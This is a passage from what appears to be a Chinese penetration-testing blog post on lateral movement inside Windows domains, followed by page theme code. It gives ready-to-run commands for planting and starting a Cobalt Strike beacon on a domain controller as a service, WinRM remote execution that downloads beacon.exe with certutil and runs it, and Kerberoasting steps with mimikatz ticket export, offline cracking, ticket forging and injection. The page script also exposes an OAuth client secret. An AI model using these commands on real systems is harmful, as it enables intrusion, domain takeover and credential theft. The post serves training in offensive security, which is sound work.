+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\OWA2010CN-GOD\C$</span><br><span class="line">shell copy dcbeacon.exe \\OWA2010CN-GOD\C$</span><br><span class="line">shell sc \\OWA2010CN-GOD create 1dcbindshell binpath= &quot;C:\dcbeacon.exe&quot;	//	需要等服务创建完成</span><br><span class="line">shell sc \\OWA2010CN-GOD start 1dcbindshell</span><br><span class="line">connect 域控IP</span><br></pre></td></tr></table></figure>
+
+<h2 id="WINRM"><a href="#WINRM" class="headerlink" title="WINRM"></a>WINRM</h2><p><code>WinRM</code>代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务的服务。默认情况下支持<code>Kerberos</code>和 <code>NTLM </code>身份验证以及基本身份验证。</p>
+<h3 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、目标系统防火墙已事先允许5985(HTTP SOAP)或5986(HTTPS SOAP)端口连入（使用前先探测这两个端口）</span><br><span class="line">2、双方都启用的Winrm rs的服务</span><br><span class="line">3、使用此服务需要管理员级别凭据。</span><br><span class="line">4、Windows2008以上版本默认自动状态，Windows Vista/win7上必须手动启动；Windows 2012之后的版本默认允许远程任意主机来管理。</span><br><span class="line">5、目标系统本地杀软、EDR未拦截Winrs.exe、Powershell.exe，cmd.exe执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 开启winrm服务</span><br><span class="line">winrm quickconfig -q</span><br><span class="line"></span><br><span class="line">// 查看服务</span><br><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20241204161658001.png" alt="image-20241204161658001"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 设置信任</span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 连接执行命令</span><br><span class="line">winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:admin!@#45 whoami</span><br><span class="line"></span><br><span class="line">// 上传</span><br><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;</span><br><span class="line">// 执行</span><br><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberoast-SPN"><a href="#Kerberoast-SPN" class="headerlink" title="Kerberoast SPN"></a>Kerberoast SPN</h2><p>攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</p>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>使用普通域用户上线cs，通过<code>setspn</code>扫描0day.org该域，通过该命令可以获取该域内主机名、角色、安装的服务等信息，进而可攻击拥有特定服务漏洞的机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -T 0day.org -q */*</span><br><span class="line">setspn -T 0day.org -q */* | findstr &quot;MSSQL&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/16318617677603.jpg" alt="16318617677603"></p>
+<p>请求的Kerberos服务票证的加密类型默认无设置情况下为AES256_HMAC_SHA1，该加密方式无法破解<br>当管理员将加密类型改为RC4_HMAC_MD5时，意味着服务帐户的NTLM密码哈希用于加密服务票证，可以通过以下命令判断使用哪种加密类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell Add-Type -AssemblyName System.IdentityModel</span><br><span class="line"></span><br><span class="line">powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/SqlServer.god.org:1433&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/16318639025937.jpg" alt="16318639025937"></p>
+<p>查看票证凭据发现当会话密钥类型为RC4_HMAC_MD5时，可进行票证导出破解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/16318646335903.jpg" alt="16318646335903"></p>
+<p>使用mimikatz导出票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::list /export&quot;</span><br></pre></td></tr></table></figure>
+
+<p>下载破解脚本加载密码字典进行离线破解，需查找最容易包含弱密码的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py pass.txt &quot;1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>或者使用服务票据改写密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python kerberoast.py -p Admin12345 -r 0DAY.ORG1.kirbi -w 0DAY.ORG.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Admin12345 -r 0DAY.ORG1.kirbi -w 0DAY.ORG.kirbi  -g 512</span><br></pre></td></tr></table></figure>
+
+<p>使用以下Mimikatz命令将新票据重新注入内存，以便通过Kerberos协议对目标服务执行身份验证。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt 0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/12/04/0x05%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-12-04 22:29:52
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                        <b>#</b> 内网渗透
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                        #内网渗透
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="横向移动">
+                        #横向移动
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-text">方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IPC"><span class="toc-text">IPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%BF%9E%E6%8E%A5"><span class="toc-text">基本连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A"><span class="toc-text">报错代码解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#at-winserver2012"><span class="toc-text">at &lt; winserver2012</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#schtasks-winserver2012"><span class="toc-text">schtasks &gt;&#x3D; winserver2012</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Atexec"><span class="toc-text">Atexec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI"><span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">利用条件和注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmic"><span class="toc-text">wmic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cscript"><span class="toc-text">cscript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexecu"><span class="toc-text">wmiexecu</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec-%E5%AE%98%E6%96%B9"><span class="toc-text">psexec(官方)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec%EF%BC%88impacket%E5%A5%97%E4%BB%B6%EF%BC%89"><span class="toc-text">psexec（impacket套件）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E4%B8%AD%E7%9A%84psexecu"><span class="toc-text">cs中的psexecu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbexec"><span class="toc-text">smbexec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-text">密码喷洒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-text">PTH - 哈希传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz-cs"><span class="toc-text">mimikatz+cs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTK-%E5%AF%86%E9%92%A5%E4%BC%A0%E9%80%92"><span class="toc-text">PTK - 密钥传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%EF%BC%88ms14-068%EF%BC%89"><span class="toc-text">PTT - 票据传递（ms14-068）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WINRM"><span class="toc-text">WINRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoast-SPN"><span class="toc-text">Kerberoast SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-text">利用</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: 'Ov23licpPbk56RG2QlZ9',
+        clientSecret: '8c17dc4d2de10cbb8846fbd6a9276cc3dc42f9e9',
+        repo: 'Yllxx03.github.io',
+        owner: 'Yllxx03',
+        admin: ['Yllxx03'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-0x06%20%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8 + '&url=' + http%3A%2F%2Fysec.site%2F2024%2F12%2F04%2F0x06%2520%25E6%25A8%25AA%25E5%2590%2591%25E7%25A7%25BB%25E5%258A%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://ysec.site/2024/12/04/0x06%20%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
